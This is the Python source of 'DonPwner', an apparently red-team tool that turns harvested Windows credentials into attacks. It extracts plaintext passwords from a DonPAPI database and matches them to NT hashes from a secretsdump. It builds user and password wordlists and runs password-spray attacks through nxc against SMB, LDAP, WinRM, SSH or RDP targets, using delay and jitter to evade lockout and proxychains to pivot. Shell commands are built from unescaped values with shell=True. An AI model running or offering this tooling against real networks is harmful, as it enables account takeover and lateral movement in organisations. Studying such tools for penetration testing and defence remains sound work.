#!/usr/bin/env python3
# -*- coding: utf-8-sig -*-
# Author - Mor David

import sqlite3
import argparse
import hashlib
import re
import sys
import os
import time
import random
import requests
import yaml
from pathlib import Path
from prettytable import PrettyTable
from urllib.parse import urlparse

# Current version
CURRENT_VERSION = "1.1.0"
VERSION_CHECK_URL = "https://mordavid.com/md_versions.yaml"

def check_for_updates(silent=False, force=False):
    """
    Check for updates from mordavid.com
    
    Args:
        silent: If True, only show update messages, not "up to date" messages
        force: If True, force check even if checked recently
    
    Returns:
        dict: Update information or None if check failed
    """
    try:
        response = requests.get(VERSION_CHECK_URL, timeout=3)
        response.raise_for_status()
        
        # Parse YAML
        data = yaml.safe_load(response.text)
        
        # Find DonPwner in the software list
        DonPwner_info = None
        for software in data.get('softwares', []):
            if software.get('name', '').lower() == 'donpwner':
                DonPwner_info = software
                break
        
        if not DonPwner_info:
            return None
        
        latest_version = DonPwner_info.get('version', '0.0.0')
        
        # Simple version comparison (assumes semantic versioning)
        if latest_version != CURRENT_VERSION:
            print(f"🔄 Update available: v{CURRENT_VERSION} → v{latest_version} | Download: {DonPwner_info.get('url', 'N/A')}\n")
            return {
                'update_available': True,
                'current_version': CURRENT_VERSION,
                'latest_version': latest_version,
                'info': DonPwner_info
            }
        else:
            if not silent:
                print(f"✅ DonPwner v{CURRENT_VERSION} is up to date\n")
            return {
                'update_available': False,
                'current_version': CURRENT_VERSION,
                'latest_version': latest_version
            }
            
    except:
        # Silent fail - no error messages for network issues
        return None

def print_banner(check_updates=True):
    """Print banner with tool information and version check"""
    banner = f"""
 █▀▄ █▀█ █▀█   █▀█ █ █ █▀█ █▀▀ █▀▄
 █ █ █ █ █ █   █▀▀ █▄█ █ █ █▀▀ █▀▄
 ▀▀  ▀▀▀ ▀ ▀   ▀   ▀ ▀ ▀ ▀ ▀▀▀ ▀ ▀
🔥 Advanced DonPAPI Analysis & Attack Tool 🎯
Version {CURRENT_VERSION} | Author: Mor David (www.mordavid.com)
💧 Password Spray Mode Enabled
"""
    print(banner)
    
    # Check for updates
    if check_updates:
        check_for_updates(silent=False)

def nt_hash(password):
    """Convert password to NT hash"""
    return hashlib.new('md4', password.encode('utf-16le')).hexdigest().upper()

def parse_username(username):
    """Parse username to extract domain and user parts"""
    if not username:
        return None, None
    
    # Check for domain\user format
    if '\\' in username:
        domain, user = username.split('\\', 1)
        return domain.strip(), user.strip()
    
    # Check for user@domain format  
    if '@' in username:
        user, domain = username.split('@', 1)
        return domain.strip(), user.strip()
    
    # Regular username
    return None, username.strip()

def load_donpapi_secrets(db_path):
    """Load secrets from donpapi database"""
    # Expand user path (~)
    expanded_path = os.path.expanduser(db_path)
    
    if not os.path.exists(expanded_path):
        print(f"❌ Error: Database file not found at {expanded_path}")
        if db_path == '~/.donpapi/donpapi.db':
            print("💡 Default path not found. Please:")
            print("   - Run donpapi to create the database first")
            print("   - Or specify custom path with --load-donpapi-db /path/to/donpapi.db")
        return []
    
    try:
        conn = sqlite3.connect(expanded_path)
        cursor = conn.cursor()
        
        # Get all secrets with username and password
        cursor.execute("""
            SELECT DISTINCT username, password 
            FROM secrets 
            WHERE username IS NOT NULL 
            AND password IS NOT NULL 
            AND username != '' 
            AND password != ''
        """)
        
        secrets = cursor.fetchall()
        conn.close()
        
        print(f"Loaded {len(secrets)} secrets from donpapi database")
        return secrets
        
    except sqlite3.Error as e:
        print(f"Database error: {e}")
        return []

def load_secretsdump(file_path):
    """Load NT hashes from secretsdump file"""
    if not os.path.exists(file_path):
        print(f"Error: Secretsdump file {file_path} not found")
        return {}
    
    nt_hashes = {}
    try:
        with open(file_path, 'r', encoding='utf-8-sig') as f:
            for line in f:
                line = line.strip()
                if ':' in line and len(line.split(':')) >= 4:
                    parts = line.split(':')
                    username = parts[0]
                    nt_hash_value = parts[3] if len(parts) > 3 else None
                    
                    if nt_hash_value and len(nt_hash_value) == 32:
                        nt_hashes[username.lower()] = nt_hash_value.upper()
        
        print(f"Loaded {len(nt_hashes)} NT hashes from secretsdump")
        return nt_hashes
        
    except Exception as e:
        print(f"Error reading secretsdump file: {e}")
        return {}

def dcsync_command(args):
    """Execute dcsync subcommand"""
    print("=== DCSYNC Analysis ===")
    
    # Load secrets from donpapi
    secrets = load_donpapi_secrets(args.load_donpapi_db)
    if not secrets:
        return
    
    # Load NT hashes from secretsdump
    nt_hashes = load_secretsdump(args.load_secretsdump)
    if not nt_hashes:
        return
    
    # Create password to NT hash mapping from donpapi
    password_to_nt = {}
    for username, password in secrets:
        password_nt = nt_hash(password)
        if password_nt not in password_to_nt:
            password_to_nt[password_nt] = []
        password_to_nt[password_nt].append((username, password))
    
    matches = []
    
    print("\nAnalyzing secretsdump users against donpapi passwords...")
    
    # Check each user from secretsdump
    for secretsdump_user, user_nt_hash in nt_hashes.items():
        if user_nt_hash in password_to_nt:
            # Found matching NT hash in donpapi passwords
            for donpapi_username, donpapi_password in password_to_nt[user_nt_hash]:
                donpapi_domain, donpapi_clean_user = parse_username(donpapi_username)
                # Also parse the secretsdump user to get its domain
                secretsdump_domain, secretsdump_clean_user = parse_username(secretsdump_user)
                
                # Use the domain from either source (prefer secretsdump domain)
                final_domain = secretsdump_domain if secretsdump_domain else donpapi_domain
                
                matches.append({
                    'secretsdump_user': secretsdump_user,
                    'nt_hash': user_nt_hash,
                    'password': donpapi_password,
                    'donpapi_username': donpapi_username,
                    'domain': final_domain,
                    'clean_user': donpapi_clean_user
                })
    
    # Display results
    if matches:
        # Group by secretsdump user to avoid duplicates
        seen_users = set()
        unique_matches = []
        for match in matches:
            if match['secretsdump_user'] not in seen_users:
                seen_users.add(match['secretsdump_user'])
                unique_matches.append(match)
        
        print(f"\n🎯 Found {len(unique_matches)} secretsdump users with known passwords:")
        
        # Create pretty table
        table = PrettyTable()
        table.field_names = ["Domain", "Secretsdump User", "Password", "NT Hash", "Found in DonPAPI"]
        table.align = "l"
        
        for match in unique_matches:
            # Parse secretsdump user to get clean username
            secretsdump_domain, secretsdump_clean_user = parse_username(match['secretsdump_user'])
            final_domain = secretsdump_domain if secretsdump_domain else match['domain']
            clean_user = secretsdump_clean_user if secretsdump_clean_user else match['secretsdump_user']
            
            table.add_row([
                final_domain if final_domain else "",
                clean_user,
                match['password'],
                match['nt_hash'][:16] + "...",  # Truncate hash for readability
                match['donpapi_username']
            ])
        
        print(table)
    else:
        print("\n❌ No secretsdump users found with known passwords from donpapi")

def extract_command(args):
    """Execute extract subcommand"""
    print("=== EXTRACT Wordlists ===")
    
    # Load secrets from donpapi
    secrets = load_donpapi_secrets(args.load_donpapi_db)
    if not secrets:
        return
    
    domains = set()
    users = set()
    passwords = set()
    user_pass_combos = set()
    
    print(f"\nProcessing {len(secrets)} secrets...")
    
    for username, password in secrets:
        domain, clean_user = parse_username(username)
        
        if domain:
            domains.add(domain)
        
        if clean_user:
            users.add(clean_user)
            user_pass_combos.add(f"{clean_user}:{password}")
        
        passwords.add(password)
    
    # Create output directory
    output_dir = Path("wordlists")
    output_dir.mkdir(exist_ok=True)
    
    # Write wordlists
    wordlists = [
        ("domains.txt", domains, "domains"),
        ("users.txt", users, "users"), 
        ("passwords.txt", passwords, "passwords"),
        ("user_pass.txt", user_pass_combos, "user:password combinations")
    ]
    
    # Create summary table
    table = PrettyTable()
    table.field_names = ["Wordlist", "Count", "Status"]
    table.align = "l"
    
    for filename, data, description in wordlists:
        if data:
            filepath = output_dir / filename
            with open(filepath, 'w', encoding='utf-8') as f:
                for item in sorted(data):
                    f.write(f"{item}\n")
            table.add_row([filename, len(data), "✅ Created"])
        else:
            table.add_row([filename, 0, "⚠️  Empty"])
    
    print("\nWordlist Summary:")
    print(table)
    print(f"\n📁 Wordlists saved to: {output_dir.absolute()}")

def attack_dcs_with_nxc(protocol='smb', target=None, user_file=None, pass_file=None, username=None, password=None, hashes=None, kerberos=False, proxychains=False, extra_args="", delay=0, jitter=0):
    """Attack target using nxc with PASSWORD SPRAY"""
    if not target:
        print("❌ No target specified for attack.")
        return False, []
    
    print(f"🎯 Target: {target}")
    print(f"📡 Protocol: {protocol.upper()}...")
    print(f"💧 Attack Mode: PASSWORD SPRAY (iterate passwords, not users)")
    if delay > 0:
        if jitter > 0:
            print(f"⏱️  Delay: {delay} minutes (±{jitter}% jitter)")
        else:
            print(f"⏱️  Delay: {delay} minutes between passwords")
    
    attack_target = target
    
    # PASSWORD SPRAY Logic: Read passwords and iterate
    if user_file and pass_file:
        # Read all passwords
        with open(pass_file, 'r', encoding='utf-8-sig') as f:
            passwords = [line.replace('\ufeff', '').strip() for line in f if line.replace('\ufeff', '').strip()]
        
        if not passwords:
            print("❌ No passwords found in password file.")
            return False, []
        
        print(f"\n🔐 Loaded {len(passwords)} passwords for spray attack")
        print(f"👥 Using user file: {user_file}")
        
        all_success_lines = []
        total_success = 0
        successful_users = set()  # Track users with successful auth
        
        import subprocess
        from pathlib import Path
        
        # Read initial users
        with open(user_file, 'r', encoding='utf-8-sig') as f:
            all_users = [line.replace('\ufeff', '').strip() for line in f if line.replace('\ufeff', '').strip()]
        
        remaining_users = set(all_users)
        
        for idx, single_pass in enumerate(passwords, 1):
            # Skip if no more users to test
            if not remaining_users:
                print(f"\n🎉 All users have been successfully authenticated!")
                print(f"⏭️  Skipping remaining {len(passwords) - idx + 1} passwords")
                break
            print(f"\n{'='*60}")
            print(f"💧 PASSWORD SPRAY {idx}/{len(passwords)}: Testing '{single_pass}' against {len(remaining_users)} remaining users")
            print(f"{'='*60}")
            
            # Create temp user file with only remaining users
            temp_user_file = Path("temp_attack") / f"remaining_users_spray{idx}.txt"
            temp_user_file.parent.mkdir(exist_ok=True)
            with open(temp_user_file, 'w', encoding='utf-8') as f:
                for user in sorted(remaining_users):
                    f.write(f"{user}\n")
            
            # Build nxc command for this password
            nxc_cmd = f"nxc {protocol} {attack_target}"
            
            # Add authentication with single password
            if hashes:
                nxc_cmd += f" -u {temp_user_file} -H '{hashes}'"
            elif kerberos:
                nxc_cmd += f" -u {temp_user_file} -k"
            else:
                nxc_cmd += f" -u {temp_user_file} -p '{single_pass}'"
            
            # Add extra arguments
            if extra_args:
                nxc_cmd += f" {extra_args}"
            
            # Add continue on success by default
            if "--continue-on-success" not in nxc_cmd:
                nxc_cmd += " --continue-on-success"
            
            if proxychains:
                nxc_cmd = f"proxychains {nxc_cmd}"
            
            print(f"🚀 Executing: {nxc_cmd}")
            
            try:
                result = subprocess.run(nxc_cmd, shell=True, capture_output=True, text=True, timeout=600)
                
                if result.stdout:
                    print(result.stdout)
                
                if result.stderr and result.stderr.strip():
                    print("STDERR:")
                    print(result.stderr)
                
                # Count successful authentications and extract usernames
                success_count = 0
                if result.stdout:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if '[+]' in line:
                            success_count += 1
                            all_success_lines.append(line.strip())
                            total_success += 1
                            
                            # Extract username from success line
                            # Format: "... [+] DOMAIN\user:password" or "... [+] user:password"
                            try:
                                if '[+]' in line:
                                    # Split by [+] and get the credential part
                                    cred_part = line.split('[+]')[1].strip()
                                    if ':' in cred_part:
                                        # Extract user part (before :)
                                        user_cred = cred_part.split(':')[0].strip()
                                        # Handle domain\user format
                                        if '\\' in user_cred:
                                            username_only = user_cred.split('\\')[1]
                                        else:
                                            username_only = user_cred
                                        
                                        # Remove from remaining users
                                        if username_only in remaining_users:
                                            remaining_users.remove(username_only)
                                            successful_users.add(username_only)
                            except:
                                pass  # If parsing fails, continue
                
                if success_count > 0:
                    print(f"✅ Password '{single_pass}': {success_count} successful authentications!")
                    print(f"📊 Remaining users to test: {len(remaining_users)}/{len(all_users)}")
                else:
                    print(f"❌ Password '{single_pass}': No matches")
                    
            except subprocess.TimeoutExpired:
                print(f"❌ Command timed out for password '{single_pass}'")
            except Exception as e:
                print(f"❌ Error testing password '{single_pass}': {e}")
            
            # Apply delay between passwords (except after the last one)
            if delay > 0 and idx < len(passwords):
                # Calculate actual delay with jitter
                actual_delay = delay
                if jitter > 0:
                    # Apply jitter: delay ± (delay * jitter/100)
                    jitter_amount = delay * (jitter / 100.0)
                    actual_delay = delay + random.uniform(-jitter_amount, jitter_amount)
                    # Ensure delay is not negative
                    actual_delay = max(0.1, actual_delay)
                
                delay_seconds = int(actual_delay * 60)
                print(f"⏱️  Waiting {actual_delay:.1f} minutes ({delay_seconds} seconds) before next password...")
                time.sleep(delay_seconds)
        
        print(f"\n{'='*60}")
        print(f"🎯 PASSWORD SPRAY COMPLETE: {total_success} total successful authentications")
        print(f"{'='*60}")
        
        return total_success > 0, all_success_lines
    
    else:
        # Fallback: single username/password (non-spray mode)
        print("⚠️  No user/pass files provided, falling back to single auth mode")
        nxc_cmd = f"nxc {protocol} {attack_target}"
        
        if hashes:
            if username:
                nxc_cmd += f" -u '{username}' -H '{hashes}'"
            elif user_file:
                nxc_cmd += f" -u {user_file} -H '{hashes}'"
            else:
                nxc_cmd += f" -u '' -H '{hashes}'"
        elif kerberos:
            nxc_cmd += " -k"
            if username:
                nxc_cmd += f" -u '{username}'"
        elif username and password:
            nxc_cmd += f" -u '{username}' -p '{password}'"
        else:
            nxc_cmd += f" -u '' -p ''"
        
        if extra_args:
            nxc_cmd += f" {extra_args}"
        
        if "--continue-on-success" not in nxc_cmd:
            nxc_cmd += " --continue-on-success"
        
        if proxychains:
            nxc_cmd = f"proxychains {nxc_cmd}"
        
        print(f"🚀 Executing: {nxc_cmd}")
        
        try:
            import subprocess
            result = subprocess.run(nxc_cmd, shell=True, capture_output=True, text=True, timeout=600)
            
            print("\n" + "="*60)
            print("NXC DC ATTACK OUTPUT:")
            print("="*60)
            
            if result.stdout:
                print(result.stdout)
            
            if result.stderr:
                print("STDERR:")
                print(result.stderr)
            
            print("="*60)
            
            success_count = 0
            success_lines = []
            if result.stdout:
                lines = result.stdout.split('\n')
                for line in lines:
                    if '[+]' in line:
                        success_count += 1
                        success_lines.append(line.strip())
            
            if success_count > 0:
                print(f"✅ Attack completed with {success_count} successful authentications!")
            else:
                print("⚠️  No successful authentications found")
            
            return success_count > 0, success_lines
            
        except subprocess.TimeoutExpired:
            print("❌ Command timed out after 10 minutes")
            return False, []
        except Exception as e:
            print(f"❌ Error during DC attack: {e}")
            return False, []

def attack_command(args):
    """Execute attack subcommand - Direct Attack"""
    print("=== ATTACK Mode - Password Spray Attack ===")
    
    if not args.target:
        print("❌ Target is required for attack")
        print("💡 Use --target <target> (e.g., 192.168.1.0/24, domain.com, or IP)")
        return
    
    # Determine wordlists for attack
    # Start with defaults
    default_user_file = 'wordlists/users.txt'
    default_pass_file = 'wordlists/passwords.txt'
    
    # Use custom files if provided, otherwise fall back to defaults
    attack_user_file = args.user_file if hasattr(args, 'user_file') and args.user_file else default_user_file
    attack_pass_file = args.pass_file if hasattr(args, 'pass_file') and args.pass_file else default_pass_file
    
    # Check if wordlists exist
    if not os.path.exists(attack_user_file):
        print(f"❌ User file not found: {attack_user_file}")
        print("💡 Create wordlists first:")
        print("   1. Run: ./donpwner.py extract")
        print("   2. Or specify: --user-file <path>")
        return
    
    if not os.path.exists(attack_pass_file):
        print(f"❌ Password file not found: {attack_pass_file}")
        print("💡 Create wordlists first:")
        print("   1. Run: ./donpwner.py extract")
        print("   2. Or specify: --pass-file <path>")
        return
    
    print(f"📝 Using wordlists:")
    print(f"   Users: {attack_user_file}")
    print(f"   Passwords: {attack_pass_file}")
    
    # Execute attack
    attack_success, success_lines = attack_dcs_with_nxc(
        protocol=args.protocol,
        target=args.target,
        user_file=attack_user_file,
        pass_file=attack_pass_file,
        username=None,
        password=None,
        hashes=None,
        kerberos=False,
        proxychains=args.proxychains,
        extra_args=args.extra_args if hasattr(args, 'extra_args') and args.extra_args else "",
        delay=args.delay if hasattr(args, 'delay') else 0,
        jitter=args.jitter if hasattr(args, 'jitter') else 0
    )
    
    # Save successful authentications to output file
    if success_lines:
        try:
            from datetime import datetime
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(args.output_file, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"Scan Time: {timestamp}\n")
                f.write(f"{'='*60}\n")
                for line in success_lines:
                    f.write(f"{line}\n")
            print(f"💾 Successful authentications appended to: {args.output_file}")
        except Exception as e:
            print(f"⚠️  Warning: Could not save output file: {e}")
    else:
        print(f"💾 No successful authentications to save to: {args.output_file}")
    
    # Cleanup temp files
    try:
        temp_dir = Path("temp_attack")
        if temp_dir.exists():
            import shutil
            shutil.rmtree(temp_dir)
            print("\n🧹 Cleaned up temporary files")
    except Exception as e:
        print(f"⚠️  Warning: Could not cleanup temp files: {e}")

def main():
    # Parse args first to check for --no-update-check
    import sys
    check_updates = '--no-update-check' not in sys.argv
    
    # Print banner
    print_banner(check_updates=check_updates)
    
    parser = argparse.ArgumentParser(description="DonPwner - Advanced DonPAPI Analysis & Attack Tool")
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # EXTRACT subcommand  
    extract_parser = subparsers.add_parser('extract', help='Extract wordlists from donpapi database')
    extract_parser.add_argument('--load-donpapi-db', default='~/.donpapi/donpapi.db', help='Path to donpapi.db file (default: ~/.donpapi/donpapi.db)')
    
    # ATTACK subcommand
    attack_parser = subparsers.add_parser('attack', help='Attack target using nxc with PASSWORD SPRAY')
    attack_parser.add_argument('--target', required=True, help='Target to attack (e.g., 192.168.1.0/24, domain.com, or IP)')
    attack_parser.add_argument('--protocol', choices=['ldap', 'smb', 'winrm', 'ssh', 'rdp'], default='smb', help='Protocol for attack (default: smb)')
    attack_parser.add_argument('--user-file', help='Custom user wordlist file (default: wordlists/users.txt)')
    attack_parser.add_argument('--pass-file', help='Custom password wordlist file (default: wordlists/passwords.txt)')
    attack_parser.add_argument('--delay', type=int, default=0, help='Delay in minutes between password attempts (default: 0)')
    attack_parser.add_argument('--jitter', type=int, default=0, help='Jitter percentage for delay randomization (default: 0, example: 20 = ±20%%)')
    attack_parser.add_argument('--extra-args', help='Extra arguments to pass to nxc command')
    attack_parser.add_argument('--output-file', default='success.txt', help='Output file to save successful authentications (default: success.txt)')
    attack_parser.add_argument('--proxychains', action='store_true', help='Use proxychains before nxc command')
    
    # DCSYNC subcommand
    dcsync_parser = subparsers.add_parser('dcsync', help='Compare donpapi secrets with secretsdump NT hashes')
    dcsync_parser.add_argument('--load-secretsdump', required=True, help='Path to secretsdump file')
    dcsync_parser.add_argument('--load-donpapi-db', default='~/.donpapi/donpapi.db', help='Path to donpapi.db file (default: ~/.donpapi/donpapi.db)')
    
    # Global arguments
    parser.add_argument('--no-update-check', action='store_true', help='Skip version update check')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    if args.command == 'dcsync':
        dcsync_command(args)
    elif args.command == 'extract':
        extract_command(args)
    elif args.command == 'attack':
        attack_command(args)

if __name__ == "__main__":
    main()
